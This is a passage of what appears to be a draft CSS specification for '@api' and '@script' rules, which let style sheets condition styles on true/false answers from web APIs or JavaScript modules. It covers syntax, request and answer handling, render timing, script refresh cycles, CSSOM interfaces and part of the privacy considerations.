<h2 id=intro>Introduction</h2>

*This section is non-normative.*

Some of what a page's look depends on isn't something CSS can know. A store's site shows an "Open now" badge
when its API says the store is open. A game shows a holiday theme when its server says an event is running. An
astronomy site shows the moon as it is tonight, which takes more arithmetic than a style sheet can do. Today each
of these needs script that asks the question, waits for the answer, and toggles a class, and the logic ends up in
one file while the styles that depend on it are in another.

This specification lets a style sheet ask the question itself. An '@api' rule gives a web API a name, an
'@script' rule gives a JavaScript module a name, and each '@param' rule asks a named source whether something is
true:

<div class=example id=example-intro>
    <pre highlight=css>
    @api --moon-phase url("https://moon.example/phase");
    @api --solar-eclipse url("https://sky.example/eclipse");
    @script --moon-calc url("/queries/moon.js");

    /* GET https://moon.example/phase?param=full */
    @param(--moon-phase, "full") {
      .moon { background-image: url(full-moon.svg); }
    }
    @param(--moon-phase, "first-quarter") or (--moon-phase, "last-quarter") {
      .moon { background-image: url(half-moon.svg); }
    }

    /* Two sources in one condition */
    @param(--moon-phase, "full") and (--solar-eclipse, "partial") {
      .sky { filter: brightness(0.6); }
    }

    /* The API couldn't answer */
    @error(--moon-phase) {
      .moon { display: none; }
    }

    /* Calls the default export of /queries/moon.js with "new" */
    @param(--moon-calc, "new") {
      .moon { opacity: 0.2; }
    }
    </pre>

    <pre highlight=js>
    // /queries/moon.js
    export default function (name) {
      return currentPhase(new Date()) === name;
    }
    </pre>
</div>

The answer to every question is true or false. Several '@param' rules can be true at once: each is its own
question, not a case in a switch. Because questions use only the name, a source can move from a server to a
script by changing the one line that declares it.

Answers load the way web fonts do. A declaration asks nothing by itself, as an ''@font-face'' rule downloads
nothing until text uses its font; a source is asked only the questions that style sheets actually ask. Rendering
waits a short time for answers, so the first paint already shows the right moon; if an answer takes longer, the
page renders without it, and the styles swap in when it arrives. A page script can't get this timing: a script
that blocks rendering also blocks parsing and has no time limit, and a script that doesn't block rendering lets
the first paint show the wrong styles.

A keyword after the URL changes this for each source, as '@font-face/font-display' does for each font:
<code>swap</code> never holds up the page, and <code>optional</code> skips an answer that misses the first
paint rather than change the page while someone is reading it.

<div class=example id=example-intro-display>
    <pre highlight=css>
    @api --store-open url("/api/store/open") swap;
    @api --holiday url("/api/holiday/theme") optional;
    </pre>
</div>

The ''param()'' test asks the same questions inside a property value, with ''if()'' [[CSS-VALUES-5]]:

<div class=example id=example-intro-if>
    <pre highlight=css>
    @api --store-open url("/api/store/open");

    .badge {
      content: if(param(--store-open): "Open now"; else: "Closed");
    }
    </pre>
</div>


<h2 id=syntax>Syntax</h2>

This specification defines four at-rules, one ''if()'' test, and one URL modifier.

<pre class=prod>
<dfn at-rule export>@api</dfn> = @api <<dashed-ident>> [ <<url>> | <<string>> ] <<query-display>>? ;
<dfn at-rule export>@script</dfn> = @script <<dashed-ident>> [ <<url>> | <<string>> ] <<query-display>>? ;
<dfn type export>&lt;query-display></dfn> = block | swap | fallback | optional
<dfn at-rule export>@param</dfn> = @param <<param-condition>> { <<block-contents>> }
<dfn at-rule export>@error</dfn> = @error <<error-condition>> { <<block-contents>> }

<dfn type export>&lt;param-condition></dfn> = not <<param-in-parens>>
                  | <<param-in-parens>> [ and <<param-in-parens>> ]*
                  | <<param-in-parens>> [ or <<param-in-parens>> ]*
<dfn type export>&lt;param-in-parens></dfn> = ( <<param-test>> ) | ( <<param-condition>> ) | <<general-enclosed>>
<dfn type export>&lt;param-test></dfn> = <<dashed-ident>> [ , <<param-value>> ]*
<dfn type export>&lt;param-value></dfn> = <<string>> | <<number>>

<dfn type export>&lt;error-condition></dfn> = not <<error-in-parens>>
                  | <<error-in-parens>> [ and <<error-in-parens>> ]*
                  | <<error-in-parens>> [ or <<error-in-parens>> ]*
<dfn type export>&lt;error-in-parens></dfn> = ( <<error-test>> ) | ( <<error-condition>> ) | <<general-enclosed>>
<dfn type export>&lt;error-test></dfn> = <<dashed-ident>> [ , <<error-kind>> ]*
<dfn type export>&lt;error-kind></dfn> = <<integer [100,599]>> | <dfn value for=@error>unavailable</dfn>
             | <dfn value for=@error>invalid</dfn> | <dfn value for=@error>timeout</dfn>
</pre>

The ''if()'' function's <<if-test>> gains one alternative:

<pre class=prod>
<<if-test>> = ... | <dfn function export lt="param()">param( <<param-test>> )</dfn>
</pre>

The URL in a [=source declaration=] can carry <<url-modifier>>s [[CSS-VALUES-4]]: the request URL modifiers
''cross-origin()'', ''integrity()'', and ''referrer-policy()'' [[CSS-VALUES-5]], and one more defined here:

<pre class=prod>
<dfn function export>timeout()</dfn> = timeout( <<time [0s,∞]>> )
</pre>

Each can appear at most once, in any order. ''integrity()'' is valid only on an '@script' URL: an '@api' answer
changes, so it has no fixed hash. A ''timeout()'' of zero, a repeated modifier, ''integrity()'' on an '@api' URL,
or any other <<url-modifier>> makes the declaration invalid. As with every <<url-modifier>>, they can only follow
a URL written as <code>url("…")</code>.

A <<param-in-parens>> or <<error-in-parens>> whose first token is a <<dashed-ident>> is a <<param-test>> or
<<error-test>>; otherwise it is a nested condition. CSS allows white space between an at-rule's name and its
prelude, so <code>@param(--moon-phase, "full")</code> and <code>@param (--moon-phase, "full")</code> are the same
rule.

<div class=note>
    A user agent that doesn't implement this specification ignores '@api' and '@script' rules, and drops
    '@param' and '@error' rules along with everything in them, so none of their styles apply. Styles that a
    page needs without an answer go outside them.
</div>

<h3 id=declaring>Declaring sources</h3>

An '@api' or '@script' rule is a <dfn export>source declaration</dfn>. Its <<dashed-ident>> is its
<dfn export>source name</dfn>, and its URL, resolved against the style sheet's base URL, is its
<dfn export>source URL</dfn>. A <<string>> is treated as a URL, as in ''@import''. The time in its ''timeout()''
modifier, if it has one, is its <dfn export>source timeout</dfn>.

<div class=example id=example-timeout>
    <pre highlight=css>
    /* Give up after 10 seconds */
    @api --store url("/api/store" timeout(10s));

    /* Send cookies to a cross-origin API, and no referrer */
    @api --rewards url("https://rewards.example/member"
                       cross-origin(use-credentials) referrer-policy(no-referrer));

    /* Run the module only if its contents match */
    @script --moon-calc url("https://cdn.example/moon.js"
                            integrity("sha384-…") timeout(500ms));
    </pre>
</div>

A [=source declaration=] is valid at the top level of a style sheet and inside [=conditional group rules=] such
as ''@media'' and ''@supports'', where ''@font-face'' and ''@keyframes'' are also allowed [[CSS-CONDITIONAL-3]].
Unlike ''@import'', it can appear in any position, before or after other rules, because it declares a name and
doesn't bring in rules. Inside a style rule, it is invalid and is ignored.

A declaration inside a [=conditional group rule=] counts only while the rule's conditions are true.

[=Source names=] are [=CSS/tree-scoped name|tree-scoped names=], as ''@keyframes'' names are
[[CSS-SHADOW-1]]. '@api' and '@script' rules share one set of names. If several [=source declarations=] that
count declare the same name, the last one in document order is used, as for ''@keyframes''
[[CSS-ANIMATIONS-1]].

<div class=example id=example-conditional-declaration>
    <pre highlight=css>
    @api --hero url("/api/hero/wide");

    @media (width < 40em) {
      @api --hero url("/api/hero/narrow");   /* used instead on narrow screens */
    }

    @param(--hero, "sale") { .hero { background-image: url(sale.jpg); } }
    </pre>

    On a narrow screen, the question goes to <code>/api/hero/narrow</code>. If the window is widened past 40em,
    the name points back at <code>/api/hero/wide</code>, and the question is asked there, once, as
    [[#tests]] describes.
</div>

<h3 id=asking>Asking questions</h3>

'@param' and '@error' rules accept the same contents as ''@media'', and can appear wherever ''@media'' can,
including inside style rules [[CSS-NESTING-1]]. They can appear before or after the declaration of the name they
use, and in a different style sheet.

A <<param-test>> asks the source with that name. A name that no [=source declaration=] declares makes the
<<param-test>> unknown, the same as an undefined custom media query in [[MEDIAQUERIES-5]], so an '@param' rule
that uses it never applies, an '@error' rule that names it never applies, and a ''param()'' test that uses it is
false.


<h2 id=questions>Questions and answers</h2>

<h3 id=tests>Tests</h3>

A <dfn export>test</dfn> is one question asked of one source. It is identified by:

* its kind: <dfn for=test>api</dfn> or <dfn for=test>script</dfn>, from the [=source declaration=] that its
    name refers to;
* that declaration's [=source URL=]; and
* its <dfn for=test>values</dfn>: the <<param-value>>s of its <<param-test>>, in order, possibly none. A
    <<string>> value is its string; a <<number>> value is the number.

The values are passed to the source as written. What they mean, and how many a question has, is up to the
source: <code>@param(--moon, "between", 10, 20)</code> passes three values, and the source decides what to do
with them.

Each [=document=] has one set of tests. Tests with the same kind, source URL, and values are the same test,
whatever names they are asked through, wherever they appear, and however many style sheets ask them, so each
question is asked once. If a name comes to refer to a different source, for example because a later style sheet
declares it again, its questions become tests of the new source.

A [=test=] has a <dfn for=test>state</dfn>, which starts as <dfn for=test/state>pending</dfn> and becomes one
of:

: <dfn for=test/state>true</dfn> or <dfn for=test/state>false</dfn>
:: The source answered.
: <dfn for=test/state>error</dfn>, with an <<error-kind>>
:: The source couldn't answer. ''@error/unavailable'' means the question couldn't be asked or the answer
    couldn't be received; ''@error/invalid'' means the source responded with something other than true or
    false; ''@error/timeout'' means the [=source timeout=] passed first; an <<integer>> is the HTTP status of
    an '@api' response that wasn't an [=ok status=].

<h3 id=evaluating>Evaluating '@param' and ''param()''</h3>

A <<param-test>> evaluates to true if its test's [=test/state=] is [=test/state/true=], to false if it is
[=test/state/false=], and to unknown if it is [=test/state/pending=] or [=test/state/error=], or if its name
isn't declared. ''not'', ''and'', and ''or'' combine these values as in media queries [[MEDIAQUERIES-4]], and a
<<general-enclosed>> is unknown.

An '@param' rule applies when its <<param-condition>> is true. A ''param()'' test is true when its
<<param-test>> is true, and false otherwise.

<div class=note>
    Pending and errors are unknown, not false, so <code>@param not (--moon-phase, "full")</code> doesn't apply
    until the source has said it isn't a full moon. Styles for a source that can't answer go in '@error'.
</div>

<h3 id=evaluating-error>Evaluating '@error'</h3>

An <<error-test>> evaluates to:

: true
:: if at least one test asked of the source with its name, anywhere in the document, is in the
    [=test/state/error=] state with a matching kind. An <<error-test>> that lists no <<error-kind>>s matches
    every kind; otherwise it matches the kinds it lists.
: unknown
:: otherwise, if its name isn't declared, or if any test of the source is [=test/state/pending=].
: false
:: otherwise.

''not'', ''and'', and ''or'' combine these values as in media queries, and a <<general-enclosed>> is unknown.
An '@error' rule applies when its <<error-condition>> is true.

<div class=example id=example-error>
    <pre highlight=css>
    @api --store url("/api/store" timeout(10s));
    @api --hours url("/api/hours");

    @param(--store, "open") { .badge::after { content: "Open now"; } }

    /* The store is gone */
    @error(--store, 404, 410) { .badge { display: none; } }

    /* Offline, or slower than 10 seconds */
    @error(--store, unavailable, timeout) { .badge { opacity: 0.5; } }

    /* Either source failed */
    @error(--store) or (--hours) { .status-panel { display: none; } }
    </pre>
</div>

While a source's tests are [=test/state/pending=], neither '@param' nor '@error' rules that depend on them apply.


<h2 id=loading>When answers arrive</h2>

Declaring a source asks nothing. A test is <dfn export for=test>needed</dfn> when an '@param' rule or
''param()'' test that asks it is in a style sheet applied to the document, and its name is declared. A user agent
asks a test as soon as it is needed. It may wait until the rule's ancestor conditions, such as an enclosing
''@media'', are true, as it may for a conditional ''@import''.

<h3 id=display>Waiting for answers: the <<query-display>> keyword</h3>

Each test has two lengths of time, both starting when it is first [=test/needed=]:

* its <dfn export>query block period</dfn>, during which rendering waits for its answer; and
* its <dfn export>query swap period</dfn>, which starts at the same moment and lasts at least as long, during
    which an answer that arrives is still used.

The <<query-display>> keyword of the test's [=source declaration=] sets them, following the values of
'@font-face/font-display' [[CSS-FONTS-4]]. A declaration without the keyword behaves as ''<query-display>/block''.

<table class=data>
    <thead>
        <tr><th>Keyword<th>Query block period<th>Query swap period
    </thead>
    <tbody>
        <tr>
            <td><dfn value for="<query-display>">block</dfn>
            <td>Short; 3 seconds is recommended
            <td>Infinite
        <tr>
            <td><dfn value for="<query-display>">swap</dfn>
            <td>Extremely short; 100 milliseconds or less is recommended
            <td>Infinite
        <tr>
            <td><dfn value for="<query-display>">fallback</dfn>
            <td>Extremely short; 100 milliseconds or less is recommended
            <td>Short; 3 seconds is recommended
        <tr>
            <td><dfn value for="<query-display>">optional</dfn>
            <td>Extremely short; 100 milliseconds or less is recommended
            <td>The same as the block period
    </tbody>
</table>

If the style sheet whose rule first needs a test is
<a href="https://html.spec.whatwg.org/multipage/dom.html#render-blocking">render-blocking</a>, the document
stays render-blocked until the test leaves the [=test/state/pending=] state, or until its [=query block
period=] ends, whichever comes first. A test first needed by a style sheet that isn't render-blocking, such as one
added by script after the page has rendered, never holds up rendering.

A test that is still [=test/state/pending=] when its [=query block period=] ends stays unknown, and its styles
apply if it answers before its [=query swap period=] ends. If the swap period ends first, the test is
<dfn for=test>abandoned</dfn> for the rest of the document: it stays unknown, and an answer or an error that
arrives later, including an ''@error/timeout'', is ignored. Neither '@param' nor '@error' rules that depend on it
ever apply, so the page shows the styles written outside them. The user agent should still let an
[=test/abandoned=] '@api' request finish, so that its answer can reach the HTTP cache for the next page load.

The two periods apply only to a test's first answer. Answers to a test asked again, as in [[#script-refresh]],
always apply, because the page has already rendered.

<div class=note>
    The extremely short block period of ''<query-display>/swap'', ''<query-display>/fallback'', and
    ''<query-display>/optional'' is there for answers that are already in the HTTP cache, which arrive in
    milliseconds. Without it, a cached answer would still show the wrong styles for one frame.
</div>

<div class=example id=example-display>
    <pre highlight=css>
    /* The hero image: worth holding the first paint for (block is the default) */
    @api --moon-phase url("https://moon.example/phase");
    @param(--moon-phase, "full") { .hero { background-image: url(full-moon.jpg); } }

    /* A small badge: never hold the page for it, show it when the answer comes */
    @api --store-open url("/api/store/open") swap;
    @param(--store-open) { .badge { display: inline-block; } }

    /* A sale banner that pushes content down: show it only if it's fast,
       so the page doesn't jump while someone is reading */
    @api --sale url("/api/sale/active" timeout(5s)) fallback;
    @param(--sale) { .sale-banner { display: block; } }

    /* A whole-page holiday theme: changing it mid-visit is jarring, so skip it
       this time. The answer lands in the HTTP cache for the next page load. */
    @api --holiday url("/api/holiday/theme") optional;
    @param(--holiday, "winter") { :root { --accent: #3a6ea5; --bg: url(snow.svg); } }

    /* The same keywords work for scripts */
    @script --flags url("/queries/flags.js" integrity("sha384-…")) swap;
    @param(--flags, "new-nav") { .nav-v2 { display: flex; } }
    </pre>
</div>

The keyword goes after <code>url()</code> because it controls rendering, not the request; ''timeout()'',
''cross-origin()'', and the other modifiers that control the request go inside it.

<h3 id=timeouts>Timeouts</h3>

If a test's [=source declaration=] has a [=source timeout=], and the test hasn't answered that long after it was
asked, its state becomes [=test/state/error=] ''@error/timeout''. For an '@api' test, the user agent aborts the
fetch. For an '@script' test, the time includes loading the [=query module=] the first time, and a call that
settles afterward is ignored. A test asked again, as in [[#script-refresh]], has the full time again.

Without ''timeout()'', a test waits as long as its source takes.

If several declarations have the same source URL but different modifiers, such as different timeouts or
different ''cross-origin()'' values, a test uses the modifiers of the declaration through which it was first
asked.

<div class=note>
    The timeout is separate from the [=query block period=] and [=query swap period=]. Those decide how long
    rendering waits for an answer and whether a late answer is used; the timeout decides when the test becomes
    an error that '@error' rules can style.
</div>

<h3 id=not-blocking>What pending tests don't block</h3>

Pending tests never:

* count toward whether the document [=has a style sheet that is blocking scripts=];
* delay the <code>DOMContentLoaded</code> or <code>load</code> event; or
* delay the <code>load</code> event of the element that loaded a style sheet.

[[#cycles]] explains why.


<h2 id=api-rule>Asking a web API: the '@api' rule</h2>

<h3 id=api-request>The request</h3>

To ask an [=test/api=] test, the user agent:

1. If the document's relevant settings object is not a [=secure context=], sets the test's state to
    [=test/state/error=] ''@error/unavailable'' and stops.
1. Lets |url| be a copy of the [=source URL=].
1. If the test has [=test/values=], appends one pair to |url|'s query, after an "&" if the query isn't empty:
    the name <code>param</code>, an "=", and the values separated by commas (","). Each value is its string,
    or for a number, its serialization as a CSS <<number>>, percent-encoded with the component percent-encode
    set, as <code>encodeURIComponent()</code> does. A test with no values leaves |url| unchanged.
1. Creates a [=request=] whose URL is |url|, whose method is <code>GET</code>, whose mode is "cors", whose
    credentials mode is "same-origin", whose destination is the empty string, whose referrer is the location of
    the style sheet that declares the source (or the document's URL for a style sheet without one), and whose
    <code>Accept</code> header is <code>application/external-query+json</code>.
1. Applies the declaration's request URL modifiers to the request, with
    [=apply request modifiers from URL value=] [[CSS-VALUES-5]]. Without ''cross-origin()'', the request
    behaves as with <code>cross-origin(anonymous)</code>: cookies go only to the document's own origin.
1. Fetches the request.

<div class=example id=example-request>
    <pre highlight=css>
    @api --moon url("https://moon.example/phase?lang=en");

    /* GET https://moon.example/phase?lang=en&amp;param=full */
    @param(--moon, "full") { … }

    /* GET https://moon.example/phase?lang=en&amp;param=between,10,20 */
    @param(--moon, "between", 10, 20) { … }

    /* GET https://moon.example/phase?lang=en&amp;param=a%2Cb,c */
    @param(--moon, "a,b", "c") { … }

    /* GET https://moon.example/phase?lang=en */
    @param(--moon) { … }
    </pre>
</div>

<div class=note>
    A comma inside a value is sent as <code>%2C</code>, so a server can tell it from a separator by splitting the
    parameter at commas before percent-decoding it. The name <code>param</code> leaves room for other names
    later, such as <code>sort</code> or <code>group</code>.
</div>

Each test is asked once per document. The answer doesn't change while the document is open; a reload asks again,
subject to the HTTP cache.

Each test is its own request; a user agent never combines several tests into one. This follows web fonts: a font
family split into several files with '@font-face/unicode-range' is fetched one file at a time, and only the
files the page uses [[CSS-FONTS-4]].

The request is governed by the document's Content Security Policy as a request made by
<code>fetch()</code> would be, through [=connect-src=]. This follows how every request from CSS is governed: by
the directive for its kind of resource. ''@import'' uses <code>style-src</code>, fonts use
<code>font-src</code>, images use <code>img-src</code>, and a request for data uses [=connect-src=].

<h3 id=api-response>The answer</h3>

The test's state is:

: [=test/state/error=] ''@error/unavailable''
:: if the fetch returns a [=network error=], including a CORS failure or a request blocked by policy.
: [=test/state/error=] with the response's status
:: if the status is not an [=ok status=].
: [=test/state/error=] ''@error/invalid''
:: if the response's MIME type essence is not <code>application/external-query+json</code>, or its body,
    parsed as JSON, is not an object with a <code>result</code> member whose value is a boolean.
: [=test/state/true=] or [=test/state/false=]
:: otherwise, from the value of <code>result</code>.

<div class=example id=example-response>
    <pre>
    HTTP/1.1 200 OK
    Content-Type: application/external-query+json
    Access-Control-Allow-Origin: *

    {"result": true}
    </pre>
</div>

Members other than <code>result</code> are ignored, so that later versions can add them.

<div class=note>
    The answer has a media type of its own so that only endpoints built to answer style sheets do. A
    style sheet can't read a page's other APIs, even on its own origin. [[#security-api]] explains the attack this
    prevents.
</div>


<h2 id=script-rule>Asking a script: the '@script' rule</h2>

<h3 id=script-module>The module</h3>

An '@script' rule's [=source URL=] names a JavaScript module, called its <dfn export>query module</dfn>. The
module's default export is the function that answers its tests:

<div class=example id=example-module>
    <pre highlight=css>
    @script --moon-calc url("/queries/moon.js");

    @param(--moon-calc, "full") { .moon { background-image: url(full-moon.svg); } }
    </pre>

    <pre highlight=js>
    // /queries/moon.js
    import { phaseOn } from "./astronomy.js";

    export default function (name) {
      return phaseOn(new Date()) === name;   // true or false
    }

    // Optional: tell CSS when answers may have changed.
    export function watch(refresh, signal) {
      const timer = setInterval(refresh, 60 * 60 * 1000);
      signal.addEventListener("abort", () => clearInterval(timer));
    }
    </pre>
</div>

A [=query module=] is loaded when one of its tests is first [=test/needed=]. To load it, the user agent:

1. If any of these is true, sets the state of every test of the module to [=test/state/error=]
    ''@error/unavailable'' and stops:
    * The document's relevant settings object is not a [=secure context=].
    * [=Scripting is disabled=] for the document.
    * The style sheet that contains the '@script' rule is not same origin with the document. A style sheet
        created by a <code>style</code> element or by script has the document's origin.
1. Fetches the module, and the modules it imports, as <code>&lt;script type=module></code> would: with
    [=fetch an external module script graph=], the document's relevant settings object, the destination
    "script", and the style sheet's location as the referrer. The fetch uses the
    <a href="https://html.spec.whatwg.org/multipage/dom.html#concept-document-module-map">document's module
    map</a>, so a module that the page has already imported is not fetched or run again. Its script fetch
    options are:
    * credentials mode "include" with <code>cross-origin(use-credentials)</code>, and "same-origin"
        otherwise;
    * integrity metadata from ''integrity()'', or none;
    * referrer policy from ''referrer-policy()'', or the default;
    * no cryptographic nonce; and
    * parser metadata "parser-inserted".
1. If the module can't be fetched or fails to evaluate, sets the state of every test of the module to
    [=test/state/error=] ''@error/unavailable''.
1. If the module's default export is not a function, sets the state of every test of the module to
    [=test/state/error=] ''@error/invalid''.
1. Otherwise, if the module has an export named <code>watch</code> that is a function, calls it once with a
    <var>refresh</var> function and an <code>AbortSignal</code>, then asks every test of the module.

The module is governed by the document's Content Security Policy as a module script is, through
[=script-src=] [[CSP3]]:

* The request carries no nonce, so a policy can't allow a query module by nonce.
* A policy can allow it by its URL, or, when the declaration has ''integrity()'', by a hash that matches it, as
    for any external script with integrity metadata.
* The request is marked as parser-inserted so that <code>&#39;strict-dynamic&#39;</code>, which trusts scripts that
    trusted scripts load, doesn't trust a module that a style sheet loads.

''integrity()'' applies to the module the declaration names. The modules it imports are checked as imports
always are, for example against the integrity metadata in an import map.

The signal is aborted when no '@script' rule in the document declares the module any more.

<h3 id=script-test>Asking the module</h3>

To ask a [=test/script=] test, the user agent calls the module's default export with the test's
[=test/values=] as arguments, possibly none: strings as JavaScript strings and numbers as JavaScript numbers.
The call happens in a task, never during style or layout.

The test's state becomes:

: [=test/state/true=] or [=test/state/false=]
:: if the function returns <code>true</code> or <code>false</code>, or returns a promise that fulfills with
    one of them.
: [=test/state/error=] ''@error/invalid''
:: if it returns any other value, including a truthy or falsy value that isn't a boolean, throws, or returns a
    promise that rejects or fulfills with anything else.

While a promise is unsettled, the test stays as it was: [=test/state/pending=] the first time, and its previous
state after that.

<h3 id=script-refresh>Asking again</h3>

Calling <var>refresh</var> marks every test of the module as needing to be asked again. During the next
[=update the rendering=] of the document, just after animation frame callbacks run, the user agent asks each
marked test once. A test whose previous call hasn't settled is asked again after it settles.

Calls to <var>refresh</var> between two renderings are combined, so a module is asked at most once per frame.

A test needed for the first time after the module has loaded, for example because of a rule added with
<code>insertRule()</code>, is asked in a task straight away; it doesn't wait for a rendering.

If a test's answer changes in each of several consecutive renderings, the user agent should report it to the
developer console, as it reports a <code>ResizeObserver</code> loop, naming the [=source name=] and the values.
It keeps asking the test, at most once per frame. [[#cycles]] explains why, and
<a href="#issue-stop-loops">an open issue</a> asks whether there should be a way to stop.


<h2 id=cycles>Script timing and cycles</h2>

*This section is non-normative.*

A [=query module=] runs in the page, so it can read anything the page can: the DOM, application state,
<code>localStorage</code>. That is what makes it useful, and it is also how it can loop. These are the cases
this specification has to handle, and how it handles each.

<h3 id=cycle-style>Style that depends on its own answer</h3>

A test that reads computed style or layout, such as <code>getComputedStyle()</code> or
<code>offsetWidth</code>, can read styles that its own answer changed. If it then calls <var>refresh</var> from
a <code>ResizeObserver</code> or <code>MutationObserver</code>, the answer can flip on every frame: true applies
styles that make it false, and false removes them.

Three rules keep this from hanging the page:

* Tests never run during style or layout, so style can't re-enter script.
* Refreshes are combined and run at most once per frame, so a flip costs one frame. The worst case is
    flicker, not a frozen page.
* A test that keeps flipping is reported to the developer console, so the author can find it.

This follows <code>ResizeObserver</code>, which has the same problem: an observer can resize the element it
observes. It never stops observing; it moves work it can't finish to the next frame and reports a loop error.
Container queries avoid the problem a different way, with containment. A test that depends on layout should ask
about something its answer doesn't change.

<h3 id=cycle-render-blocking>Waiting for rendering while rendering waits</h3>

While a style sheet is render-blocking, the document doesn't render, so animation frame callbacks don't run. A
test that waits for a frame, for example with <code>await new Promise(requestAnimationFrame)</code>, would wait
forever for a rendering that waits for it.

Two rules break this:

* The [=query block period=] always ends, and then the document renders without the answer.
* A module's first answers are asked for in a task as soon as it loads, not during a rendering, so they never
    need a frame to start.

<h3 id=cycle-loading>Waiting for the page while the page waits</h3>

If pending tests made their style sheet block scripts, or delayed <code>DOMContentLoaded</code> or
<code>load</code>, then a test that waits for one of those, for example to read <code>document.body</code>,
would wait for an event that waits for it. Pending tests delay none of them. A query module can run before the
document has finished parsing, so a test that needs the DOM should wait for <code>DOMContentLoaded</code>.

<h3 id=cycle-cssom>Tests that change style sheets</h3>

A test can change the style sheets that ask it, for example by inserting another '@param' rule. Each new set of
values is a new test, asked once, so this can't loop on its own; a test that keeps inventing values keeps
creating tests, as any script can keep creating rules. A test can also declare a name again, pointing it at
another source; the questions then go to that source once, as described in [[#tests]]. Removing the last
'@script' rule for a module aborts its <code>watch</code> signal, and answers that arrive afterward are ignored.

<h3 id=cycle-modules>Modules that load modules</h3>

A query module can import the page's own modules and share their state, because it uses the document's module
map. A module runs once per document however many style sheets declare it, so a test that inserts a style sheet
declaring the same module doesn't load it again.

<h3 id=cycle-between>Tests that depend on other tests</h3>

A test can read styles that another test's answer sets. Answers arrive in no particular order, so it may read
them before the other answer arrives. It isn't asked again when the other answer arrives unless it calls
<var>refresh</var>, which brings back the per-frame limit above.


<h2 id=cssom>CSSOM</h2>

<pre class=idl>
[Exposed=Window]
interface CSSAPIRule : CSSRule {
  readonly attribute CSSOMString name;
  readonly attribute USVString href;
  readonly attribute CSSOMString display;
};

[Exposed=Window]
interface CSSScriptRule : CSSRule {
  readonly attribute CSSOMString name;
  readonly attribute USVString href;
  readonly attribute CSSOMString display;
};

[Exposed=Window]
interface CSSParamRule : CSSConditionRule {
};

[Exposed=Window]
interface CSSErrorRule : CSSConditionRule {
};
</pre>

The <dfn attribute for=CSSAPIRule>name</dfn> and <dfn attribute for=CSSScriptRule>name</dfn> attributes return
the rule's [=source name=]. The <dfn attribute for=CSSAPIRule>href</dfn> and
<dfn attribute for=CSSScriptRule>href</dfn> attributes return its URL as written. The
<dfn attribute for=CSSAPIRule>display</dfn> and <dfn attribute for=CSSScriptRule>display</dfn> attributes
return its <<query-display>> keyword, or <code>"block"</code> if it has none. The
<code>conditionText</code> of a {{CSSParamRule}} is its <<param-condition>>, serialized, and that of a
{{CSSErrorRule}} is its parenthesized prelude, serialized.

<h3 id=script-api>Reading answers from script</h3>

Script reads a question's state the way it reads a web font's: with an object like <code>FontFace</code>, from a
set like <code>document.fonts</code> [[CSS-FONT-LOADING-3]].

<pre class=idl>
partial interface Document {
  [SameObject] readonly attribute ExternalQuerySet externalQueries;
};

[Exposed=Window]
interface ExternalQuerySet {
  ExternalQuery? get(CSSOMString name, (CSSOMString or double)... values);
  readonly attribute Promise&lt;ExternalQuerySet> ready;
};

enum ExternalQueryStatus { "unasked", "pending", "true", "false", "error", "abandoned" };

[Exposed=Window]
interface ExternalQuery : EventTarget {
  readonly attribute CSSOMString name;
  readonly attribute FrozenArray&lt;(CSSOMString or double)> values;
  readonly attribute ExternalQueryStatus status;
  readonly attribute CSSOMString? error;
  readonly attribute Promise&lt;boolean> answered;
  attribute EventHandler onchange;
};
</pre>

<dl>
    <dt><dfn method for=ExternalQuerySet>get(name, ...values)</dfn>
    <dd>
        Returns the {{ExternalQuery}} for the question that a <<param-test>> with this name and these values
        would ask, or null if no [=source declaration=] that counts declares the name. Strings are <<string>>
        values and numbers are <<number>> values. The same question returns the same object for as long as the
        name refers to the same source. Calling it doesn't ask the question.

    <dt><dfn attribute for=ExternalQuerySet>ready</dfn>
    <dd>
        A promise that fulfills with the set once no question that the document's style sheets need is
        [=test/state/pending=], like <code>document.fonts.ready</code>. When a question becomes pending after it
        has fulfilled, the attribute returns a new promise.

    <dt><dfn attribute for=ExternalQuery>status</dfn>
    <dd>
        <code>"unasked"</code> if no style sheet needs the question; <code>"abandoned"</code> if it was
        [=test/abandoned=]; otherwise the test's [=test/state=]: <code>"pending"</code>, <code>"true"</code>,
        <code>"false"</code>, or <code>"error"</code>.

    <dt><dfn attribute for=ExternalQuery>error</dfn>
    <dd>
        The <<error-kind>> when {{ExternalQuery/status}} is <code>"error"</code>: <code>"unavailable"</code>,
        <code>"invalid"</code>, <code>"timeout"</code>, or an HTTP status such as <code>"404"</code>. Null
        otherwise.

    <dt><dfn attribute for=ExternalQuery>answered</dfn>
    <dd>
        A promise for the question's first answer, like <code>FontFace.loaded</code>. It fulfills with true or
        false when the source answers, rejects with a "<code>NetworkError</code>" {{DOMException}} if the test
        ends in an error, and rejects with an "<code>AbortError</code>" {{DOMException}} if it is abandoned.
        Later answers, after a refresh, are reported by <code>change</code> events.

    <dt><dfn attribute for=ExternalQuery>onchange</dfn>
    <dd>
        A <code>change</code> event is fired at the {{ExternalQuery}} whenever its {{ExternalQuery/status}}
        changes, during the same [=update the rendering=] that applies the change to style, at the step where
        <code>MediaQueryList</code> <code>change</code> events are fired.
</dl>

<div class=example id=example-script-api>
    <pre highlight=js>
    const store = document.externalQueries.get("--store-open");
    if (await store.answered) {
      announce("The store is open now.");
    }
    store.addEventListener("change", () => console.log(store.status));
    </pre>
</div>

These objects reveal nothing that page script can't already learn from the styles the answers change, with
<code>getComputedStyle()</code>, and {{ExternalQuerySet/get()}} never asks a question that no style sheet asks.


<h2 id=privacy>Privacy considerations</h2>

<h3 id=privacy-requests>What an '@api' request reveals</h3>

A style sheet can already make requests to any URL, with ''@import'' and with <<url>> values, and can make them
only when a media query matches. An '@api' rule adds no new way to send information: its values are fixed in
the style sheet, each question is asked once per document, and a question can't carry anything about an element,
such as an attribute value. A request that is made only when an enclosing ''@media'' matches reveals that the
media query matched, exactly as a background image under the same ''@media'' would.

<h3 id=privacy-cookies>Credentials and tracking</h3>

By default, requests carry cookies only to the document's own origin, so a cross-origin API can't answer
differently for a user it recognizes from other sites.

With <code>cross-origin(use-credentials)</code>, a request carries cookies to a cross-origin API too. The user
agent's rules for third-party cookies still apply, and the answer is used only if the API allows credentials in
its CORS response, naming the document's origin exactly. An image request already carries cookies under the same
third-party rules, so this gives no new way to track a user; what it adds is that the API's answer for that user
can change the page's style, which the API has to opt into.

''referrer-policy()'' lets a page send less in the <code>Referer</code> header than its default policy does.

<h3 id=privacy-without-script>Pages without script</h3>

'@api' works when script is disabled. A server can already send different style sheets to different requests,
so this changes what is convenient, not what is possible. A user agent that blocks remote resources, as many
mail clients do, should treat every '@api' test as [=test/state/error=] ''@error/unavailable''.

<h3 id=privacy-script>Query modules</h3>

